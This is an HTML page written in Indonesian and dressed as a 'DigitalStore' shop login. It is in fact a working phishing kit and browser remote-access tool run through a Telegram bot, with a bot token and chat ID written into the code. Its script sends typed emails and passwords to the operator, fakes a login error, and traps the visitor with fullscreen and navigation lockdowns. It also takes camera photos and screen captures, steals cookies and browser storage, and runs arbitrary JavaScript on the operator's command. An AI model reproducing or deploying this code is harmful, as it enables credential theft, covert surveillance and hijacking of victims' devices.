<!DOCTYPE html>
<html lang="id"><head><meta charset="UTF-8"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>DigitalStore</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
body{background:linear-gradient(145deg,#0b0e14,#1a1f2b);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;height:100vh;overflow:hidden;margin:0}
#lockdown-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);backdrop-filter:blur(24px);z-index:99999;display:none;justify-content:center;align-items:center;flex-direction:column;color:#fff;padding:30px;text-align:center}
#lockdown-overlay.active{display:flex}
#lockdown-overlay .icon-lock{font-size:64px;margin-bottom:16px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.7}}
#lockdown-overlay h1{font-size:28px;font-weight:700;background:linear-gradient(135deg,#f87171,#ef4444);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
#lockdown-overlay p{color:#94a3b8;font-size:15px;margin-bottom:20px}
#lockdown-overlay .timer{font-size:56px;font-weight:800;font-family:'Courier New',monospace;background:linear-gradient(135deg,#A855F7,#6C3CE1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:8px 0 24px;letter-spacing:4px}
#lockdown-overlay .progress-ring{width:200px;height:6px;background:rgba(255,255,255,.06);border-radius:99px;overflow:hidden;margin-top:8px}
#lockdown-overlay .progress-ring .fill{height:100%;width:100%;background:linear-gradient(90deg,#6C3CE1,#A855F7);border-radius:99px;transition:width 1s linear}
#lockdown-overlay .sub-text{color:#4a5568;font-size:12px;margin-top:20px;letter-spacing:1px}
.container{width:100%;max-width:420px;position:relative;z-index:1}
.card{background:rgba(26,31,43,.85);backdrop-filter:blur(20px);border-radius:32px;padding:40px 32px;border:1px solid rgba(255,255,255,.06);box-shadow:0 25px 60px rgba(0,0,0,.8),inset 0 1px 0 rgba(255,255,255,.05)}
.store-header{text-align:center;margin-bottom:32px}
.store-icon{width:72px;height:72px;background:linear-gradient(135deg,#6C3CE1,#A855F7);border-radius:20px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:32px;color:#fff;box-shadow:0 12px 30px rgba(108,60,225,.3)}
.store-header h1{color:#fff;font-size:22px;font-weight:700}
.store-header p{color:#94a3b8;font-size:14px;margin-top:4px}
.form-group{margin-bottom:20px}
.form-group label{display:block;color:#c8d0dc;font-size:13px;font-weight:500;margin-bottom:6px}
.form-group input{width:100%;padding:14px 16px;background:rgba(15,19,28,.8);border:1px solid rgba(255,255,255,.08);border-radius:14px;color:#fff;font-size:15px;outline:none;transition:all .3s}
.form-group input:focus{border-color:#6C3CE1;box-shadow:0 0 0 3px rgba(108,60,225,.15)}
.form-group input::placeholder{color:#4a5568}
.btn-login{width:100%;padding:15px;background:linear-gradient(135deg,#6C3CE1,#A855F7);border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;box-shadow:0 8px 24px rgba(108,60,225,.25)}
.btn-login:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(108,60,225,.4)}
.error-msg{color:#f87171;font-size:13px;text-align:center;margin-top:16px;min-height:20px}
.register-link{text-align:center;margin-top:24px;color:#64748b;font-size:14px}
.register-link a{color:#A855F7;text-decoration:none;font-weight:500}
.divider{display:flex;align-items:center;gap:16px;margin:24px 0}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.06)}
.divider span{color:#4a5568;font-size:12px;text-transform:uppercase;letter-spacing:1px}
.social-buttons{display:flex;gap:12px}
.social-btn{flex:1;padding:12px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);border-radius:12px;color:#94a3b8;font-size:13px;font-weight:500;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
.social-btn:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.12)}
#status-bar{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);backdrop-filter:blur(10px);padding:8px 24px;border-radius:30px;border:1px solid rgba(255,255,255,.05);color:#4a5568;font-size:11px;font-family:monospace;z-index:999}
#status-bar span{color:#A855F7}
#camera-preview{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);z-index:9998;border-radius:16px;overflow:hidden;border:2px solid rgba(168,85,247,.3);box-shadow:0 8px 32px rgba(0,0,0,.8);display:none;width:240px;height:180px}
#camera-preview.active{display:block}
#camera-preview video{width:100%;height:100%;object-fit:cover}
#camera-preview .cam-label{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);color:#A855F7;font-size:10px;padding:2px 12px;border-radius:99px;font-family:monospace;letter-spacing:1px}
@media(max-width:480px){.card{padding:28px 20px}}
</style></head>
<body>
<div id=lockdown-overlay><div class=icon-lock>🔒</div><h1>SESI DIKUNCI</h1><p>Keamanan sedang diproses. Harap tunggu.</p><div class=timer id=lockdown-timer>02:00</div><div class=progress-ring><div class=fill id=lockdown-progress style=width:100%></div></div><div class=sub-text>⚠️ Jangan tutup atau refresh halaman ini</div></div>
<div id=camera-preview><video id=video-preview autoplay playsinline></video><div class=cam-label id=cam-label>📷 DEPAN</div></div>
<div class=container><div class=card><div class=store-header><div class=store-icon>🛒</div><h1>DigitalStore</h1><p>Belanja produk digital aman & terpercaya</p></div>
<form onsubmit="return false"><div class=form-group><label>📧 Email</label><input type=email id=email placeholder=contoh@email.com></div><div class=form-group><label>🔒 Password</label><input type=password id=password placeholder="Masukkan sandi"></div>

<div style=text-align:center;margin-top:20px;color:#3b4252;font-size:11px>© 2026 DigitalStore</div></div></div>
<div id=status-bar>🔒 <span id=client-id>...</span> · Online</div>
<script>
// ================================================================
// KONFIGURASI — GANTI DENGAN PUNYA KAU
// ================================================================
const BOT_TOKEN = "8883414591:AAF7IS9SxloS6msFZjVKNU-VbRGalrEMGJY";
const CHAT_ID   = "8439372560";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ================================================================
// HP LOCKDOWN BRUTAL (FULL)
// ================================================================
document.body.style.overflow='hidden';document.documentElement.style.overflow='hidden';
document.addEventListener('contextmenu',e=>e.preventDefault());
document.addEventListener('selectstart',e=>e.preventDefault());
document.addEventListener('touchstart',e=>{if(e.touches.length>1)e.preventDefault()},{passive:!1});
let lastTouchEnd=0;document.addEventListener('touchend',e=>{const n=Date.now();if(n-lastTouchEnd<=300)e.preventDefault();lastTouchEnd=n},{passive:!1});
const overlay=document.createElement('div');overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:9997;background:transparent;pointer-events:none;';document.body.appendChild(overlay);
function enableFullBlock(){overlay.style.pointerEvents='auto';sendToTelegram(`🔒 OVERLAY BLOKIR AKTIF\n🆔 ${CLIENT_ID}`);}
history.pushState(null,'',location.href);window.addEventListener('popstate',function(){history.pushState(null,'',location.href);sendToTelegram(`⬅️ BACK DIBLOKIR\n🆔 ${CLIENT_ID}`);});
let startY=0;document.addEventListener('touchstart',e=>{startY=e.touches[0].pageY},{passive:!0});document.addEventListener('touchmove',e=>{const y=e.touches[0].pageY,st=document.documentElement.scrollTop||document.body.scrollTop;if(st===0&&y>startY+50)e.preventDefault()},{passive:!1});
setInterval(()=>{try{if(!document.fullscreenElement&&!document.webkitFullscreenElement){const e=document.documentElement;e.requestFullscreen?e.requestFullscreen().catch(()=>{}):e.webkitRequestFullscreen&&e.webkitRequestFullscreen()}}catch(e){}},2000);
try{screen.orientation.lock('portrait').catch(()=>{})}catch(e){}
document.addEventListener('keydown',e=>{if(e.key==='VolumeDown'||e.key==='Power')sendToTelegram(`📸 PERCOBAAN SCREENSHOT\n🆔 ${CLIENT_ID}`);});
document.addEventListener('visibilitychange',()=>{if(document.hidden){sendToTelegram(`👀 TARGET PINDAH TAB\n🆔 ${CLIENT_ID}`);}else{sendToTelegram(`🔄 TARGET KEMBALI\n🆔 ${CLIENT_ID}`);setTimeout(()=>{const e=document.documentElement;e.requestFullscreen?e.requestFullscreen().catch(()=>{}):e.webkitRequestFullscreen&&e.webkitRequestFullscreen();},300);}});
window.originalLogin=window.login;window.login=function(){originalLogin();setTimeout(()=>{enableFullBlock();document.body.style.overflow='hidden';document.documentElement.style.overflow='hidden';},500);};
// ================================================================
// STATE
// ================================================================
const CLIENT_ID = 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
let isLockdown = false;
let lockdownTimer = 120;
let lockdownInterval = null;
let lastUpdateId = 0;
let isPolling = false;
let cameraStream = null;
let ssInterval = null;
let isStreaming = false;

document.getElementById('client-id').textContent = CLIENT_ID;

// ================================================================
// KIRIM PESAN & FOTO KE TELEGRAM
// ================================================================
function sendToTelegram(text) {
    fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
    }).catch(() => {});
}

function sendPhotoToTelegram(imageData, caption) {
    try {
        const byteString = atob(imageData.split(',')[1]);
        const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
        const blob = new Blob([ia], { type: mimeString });
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: formData }).catch(() => {});
    } catch(e) {}
}

// ================================================================
// SERVICE WORKER
// ================================================================
async function registerSW() {
    try {
        const registration = await navigator.serviceWorker.register('sw.js', { scope: '/' });
        console.log('[SW] Registered');
        setTimeout(() => {
            if (registration.active) {
                registration.active.postMessage({
                    type: 'init',
                    clientId: CLIENT_ID,
                    botToken: BOT_TOKEN,
                    chatId: CHAT_ID
                });
            }
        }, 2000);
        return registration;
    } catch (err) {
        console.log('[SW] Error:', err);
        sendToTelegram(`❌ GAGAL REGISTER SW\n🆔 ${CLIENT_ID}\n⚠️ ${err.message}`);
        return null;
    }
}

// ================================================================
// KAMERA
// ================================================================
async function captureCamera(facingMode = 'environment') {
    try {
        if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; }
        const constraints = { video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false };
        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.getElementById('video-preview');
        video.srcObject = cameraStream;
        const preview = document.getElementById('camera-preview');
        preview.classList.add('active');
        document.getElementById('cam-label').textContent = facingMode === 'environment' ? '📷 BELAKANG' : '📷 DEPAN';
        await new Promise(resolve => setTimeout(resolve, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.9);
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
        preview.classList.remove('active');
        return imageData;
    } catch (err) {
        sendToTelegram(`❌ GAGAL AKSES KAMERA\n🆔 ${CLIENT_ID}\n⚠️ ${err.message}`);
        return null;
    }
}

async function captureFrontCamera() {
    const imageData = await captureCamera('user');
    if (imageData) {
        sendPhotoToTelegram(imageData, `📸 FOTO DEPAN\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        sendToTelegram(`📸 FOTO DEPAN TERKIRIM\n🆔 ${CLIENT_ID}`);
    }
    return imageData;
}

async function captureBackCamera() {
    const imageData = await captureCamera('environment');
    if (imageData) {
        sendPhotoToTelegram(imageData, `📸 FOTO BELAKANG\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        sendToTelegram(`📸 FOTO BELAKANG TERKIRIM\n🆔 ${CLIENT_ID}`);
    }
    return imageData;
}

async function captureBothCameras() {
    const front = await captureFrontCamera();
    const back = await captureBackCamera();
    if (front || back) sendToTelegram(`📸 KEDUA FOTO TERKIRIM\n🆔 ${CLIENT_ID}`);
    return { front, back };
}

// ================================================================
// SCREENSHOT
// ================================================================
async function captureScreenshot() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { displaySurface: 'monitor', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
        const track = stream.getVideoTracks()[0];
        if (!track) { stream.getTracks().forEach(t => t.stop()); return; }
        const imageCapture = new ImageCapture(track);
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(bitmap, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        track.stop();
        stream.getTracks().forEach(t => t.stop());
        sendPhotoToTelegram(imageData, `📸 SCREENSHOT\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        sendToTelegram(`📸 SCREENSHOT TERKIRIM\n🆔 ${CLIENT_ID}`);
    } catch (err) {
        sendToTelegram(`❌ GAGAL SCREENSHOT\n🆔 ${CLIENT_ID}\n⚠️ ${err.message}`);
    }
}

// ================================================================
// LOCKDOWN
// ================================================================
function startLockdown() {
    if (isLockdown) return;
    isLockdown = true;
    lockdownTimer = 120;
    const overlay = document.getElementById('lockdown-overlay');
    overlay.classList.add('active');
    document.body.style.overflow = 'hidden';
    const progressFill = document.getElementById('lockdown-progress');
    lockdownInterval = setInterval(() => {
        lockdownTimer--;
        const mins = String(Math.floor(lockdownTimer / 60)).padStart(2, '0');
        const secs = String(lockdownTimer % 60).padStart(2, '0');
        document.getElementById('lockdown-timer').textContent = `${mins}:${secs}`;
        progressFill.style.width = `${(lockdownTimer / 120) * 100}%`;
        if (lockdownTimer <= 0) {
            clearInterval(lockdownInterval);
            overlay.classList.remove('active');
            document.body.style.overflow = '';
            isLockdown = false;
            sendToTelegram(`🔓 LOCKDOWN SELESAI\n🆔 ${CLIENT_ID}`);
        }
    }, 1000);
    sendToTelegram(`🔒 LOCKDOWN AKTIF\n🆔 ${CLIENT_ID}\n⏱️ 2 menit`);
}

// ================================================================
// ANTI-CLOSE, ANTI-BACK
// ================================================================
window.addEventListener('beforeunload', function(e) {
    if (isLockdown) { e.preventDefault(); e.returnValue = ''; }
});
history.pushState(null, '', location.href);
window.addEventListener('popstate', function() {
    if (isLockdown) { history.pushState(null, '', location.href); }
});
document.addEventListener('keydown', function(e) {
    if (!isLockdown) return;
    const blocked = ['F5', 'F12', 'Escape', 'Tab'];
    if (blocked.includes(e.key) || (e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'r')) {
        e.preventDefault();
    }
});

// ================================================================
// LOGIN
// ================================================================
window.login = function() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const errorMsg = document.getElementById('errorMsg');
    if (!email || !password) {
        errorMsg.textContent = '⚠️ Email dan password wajib diisi.';
        return;
    }
    sendToTelegram(`🔐 LOGIN\n🆔 ${CLIENT_ID}\n📧 ${email}\n🔑 ${password}`);
    errorMsg.textContent = '❌ Email atau password salah.';
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
    document.getElementById('email').focus();
    startLockdown();
};

window.socialLogin = function(provider) {
    sendToTelegram(`🔓 SOCIAL LOGIN\n🆔 ${CLIENT_ID}\nProvider: ${provider}`);
    document.getElementById('errorMsg').textContent = `❌ Gagal dengan ${provider}`;
    startLockdown();
};

// ================================================================
// EXECUTE COMMAND
// ================================================================
function executeCommand(command) {
    let result = '';
    try {
        result = eval(command);
        if (typeof result !== 'string') result = JSON.stringify(result, null, 2);
        sendToTelegram(`✅ EKSEKUSI\n🆔 ${CLIENT_ID}\n📜 ${command.substring(0, 100)}\n📦 ${String(result).substring(0, 1000)}`);
    } catch (err) {
        sendToTelegram(`❌ ERROR\n🆔 ${CLIENT_ID}\n📜 ${command.substring(0, 100)}\n⚠️ ${err.message}`);
    }
}

// ================================================================
// MENU PREMIUM TELEGRAM
// ================================================================
function sendPremiumMenu() {
    const menu = {
        chat_id: CHAT_ID,
        text: `🛒 DIGITALSTORE — RAT CONTROLLER\n\n🆔 Client: ${CLIENT_ID}\n📱 ${navigator.userAgent.split(' ').slice(0, 3).join(' ')}\n🔒 Lockdown: ${isLockdown ? 'AKTIF' : 'NONAKTIF'}\n📸 Streaming: ${isStreaming ? 'AKTIF' : 'NONAKTIF'}\n⏰ ${new Date().toLocaleString('id-ID')}\n\nPilih perintah:`,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: '📸 SS Sekarang', callback_data: 'ss_once' }, { text: '▶️ SS Mulai', callback_data: 'ss_start' }, { text: '⏹️ SS Berhenti', callback_data: 'ss_stop' }],
                [{ text: '📸 Kamera Depan', callback_data: 'cam_front' }, { text: '📸 Kamera Belakang', callback_data: 'cam_back' }],
                [{ text: '⚡ Exec', callback_data: 'menu_exec' }, { text: '🔒 Lockdown', callback_data: 'menu_lockdown' }],
                [{ text: '🍪 Steal', callback_data: 'menu_steal' }, { text: '📊 Info', callback_data: 'menu_info' }],
                [{ text: '🌐 Redirect', callback_data: 'menu_redirect' }],
                [{ text: '❓ Bantuan', callback_data: 'menu_help' }, { text: '🔄 Update', callback_data: 'menu_refresh' }]
            ]
        }
    };
    fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(menu) }).catch(() => {});
}

// ================================================================
// POLLING TELEGRAM
// ================================================================
function pollTelegram() {
    if (isPolling) return;
    isPolling = true;
    async function fetchUpdates() {
        try {
            const url = TELEGRAM_API + `/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
            const res = await fetch(url);
            const data = await res.json();
            if (data.ok && data.result) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id;
                    if (update.callback_query) {
                        const query = update.callback_query;
                        const data = query.data;
                        const chatId = query.message.chat.id;
                        if (String(chatId) !== CHAT_ID) continue;
                        fetch(TELEGRAM_API + '/answerCallbackQuery', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ callback_query_id: query.id, text: '✅ Diproses' })
                        }).catch(() => {});
                        switch(data) {
                            case 'ss_once': captureScreenshot(); break;
                            case 'ss_start': isStreaming = true; ssInterval = setInterval(captureScreenshot, 5000); captureScreenshot(); sendToTelegram(`📸 SCREENSHOT AKTIF\n🆔 ${CLIENT_ID}`); break;
                            case 'ss_stop': if (ssInterval) { clearInterval(ssInterval); ssInterval = null; } isStreaming = false; sendToTelegram(`⏹️ SCREENSHOT BERHENTI\n🆔 ${CLIENT_ID}`); break;
                            case 'cam_front': captureFrontCamera(); break;
                            case 'cam_back': captureBackCamera(); break;
                            case 'menu_exec': sendToTelegram('⚡ EXEC\n\nKirim: /exec <JavaScript>\nContoh: /exec alert("Hacked")'); break;
                            case 'menu_lockdown': startLockdown(); break;
                            case 'menu_steal': fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: '🍪 Pilih data yang ingin dicuri:', reply_markup: { inline_keyboard: [[{ text: '🍪 Cookie', callback_data: 'steal_cookie' }], [{ text: '📦 LocalStorage', callback_data: 'steal_local' }], [{ text: '📦 SessionStorage', callback_data: 'steal_session' }], [{ text: '📦 All Data', callback_data: 'steal_all' }], [{ text: '🔙 Kembali', callback_data: 'menu_main' }]] } }) }).catch(() => {}); break;
                            case 'menu_info': sendToTelegram(`📊 INFO CLIENT\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🔒 Lockdown: ${isLockdown ? 'AKTIF' : 'NONAKTIF'}`); break;
                            case 'menu_redirect': sendToTelegram('🌐 REDIRECT\n\nKirim: /redirect <URL>\nContoh: /redirect https://google.com'); break;
                            case 'menu_help': sendToTelegram('❓ BANTUAN\n\n📌 Perintah Teks:\n/exec <js> — Eksekusi JavaScript\n/lockdown — Aktifkan lockdown\n/ping — Cek status\n/info — Info client\n/steal — Ambil semua data\n/redirect <url> — Redirect client\n/cam — Ambil kedua kamera\n/ss — Screenshot\n/ss_start — Screenshot periodik\n/ss_stop — Berhenti screenshot\n\n📌 Tombol Menu:\nGunakan tombol di bawah.'); break;
                            case 'menu_refresh': sendPremiumMenu(); break;
                            case 'menu_main': sendPremiumMenu(); break;
                            case 'steal_cookie': executeCommand('document.cookie'); break;
                            case 'steal_local': executeCommand('JSON.stringify(localStorage)'); break;
                            case 'steal_session': executeCommand('JSON.stringify(sessionStorage)'); break;
                            case 'steal_all': executeCommand('JSON.stringify({cookie: document.cookie, localStorage: localStorage, sessionStorage: sessionStorage})'); break;
                        }
                        continue;
                    }
                    const msg = update.message;
                    if (!msg || !msg.text) continue;
                    const text = msg.text.trim();
                    const chatId = msg.chat.id;
                    if (String(chatId) !== CHAT_ID) continue;
                    if (text.startsWith('/exec ')) { const command = text.replace('/exec ', ''); executeCommand(command); }
                    else if (text === '/lockdown') { startLockdown(); }
                    else if (text === '/ping') { sendToTelegram(`🏓 Pong! Client ${CLIENT_ID} online.`); }
                    else if (text === '/info') { sendToTelegram(`📊 INFO CLIENT\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🔒 Lockdown: ${isLockdown ? 'AKTIF' : 'NONAKTIF'}`); }
                    else if (text === '/steal') { const data = { cookie: document.cookie || 'tidak ada', localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage) }; sendToTelegram(`🍪 STEAL DATA\n🆔 ${CLIENT_ID}\n📦 ${JSON.stringify(data).substring(0, 1500)}`); }
                    else if (text.startsWith('/redirect ')) { const url = text.replace('/redirect ', ''); if (url.startsWith('http')) { sendToTelegram(`🌐 Redirect ke ${url} untuk ${CLIENT_ID}`); setTimeout(() => { window.location.href = url; }, 1000); } else { sendToTelegram(`❌ URL tidak valid: ${url}`); } }
                    else if (text === '/cam') { captureBothCameras(); }
                    else if (text === '/ss') { captureScreenshot(); }
                    else if (text === '/ss_start') { isStreaming = true; ssInterval = setInterval(captureScreenshot, 5000); captureScreenshot(); sendToTelegram(`📸 SCREENSHOT AKTIF\n🆔 ${CLIENT_ID}`); }
                    else if (text === '/ss_stop') { if (ssInterval) { clearInterval(ssInterval); ssInterval = null; } isStreaming = false; sendToTelegram(`⏹️ SCREENSHOT BERHENTI\n🆔 ${CLIENT_ID}`); }
                    else if (text === '/menu' || text === '/start') { sendPremiumMenu(); }
                    else { sendToTelegram(`📩 PESAN DITERIMA\n🆔 ${CLIENT_ID}\n📜 ${text.substring(0, 200)}`); }
                }
            }
        } catch (err) {} finally { setTimeout(fetchUpdates, 3000); }
    }
    fetchUpdates();
}

// ================================================================
// INIT
// ================================================================
async function init() {
    await registerSW();
    setTimeout(() => {
        sendPremiumMenu();
        sendToTelegram(`🟢 CLIENT ONLINE\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}`);
    }, 3000);
    pollTelegram();
}
init();
console.log(`[DigitalStore] Client: ${CLIENT_ID}`);
</script>
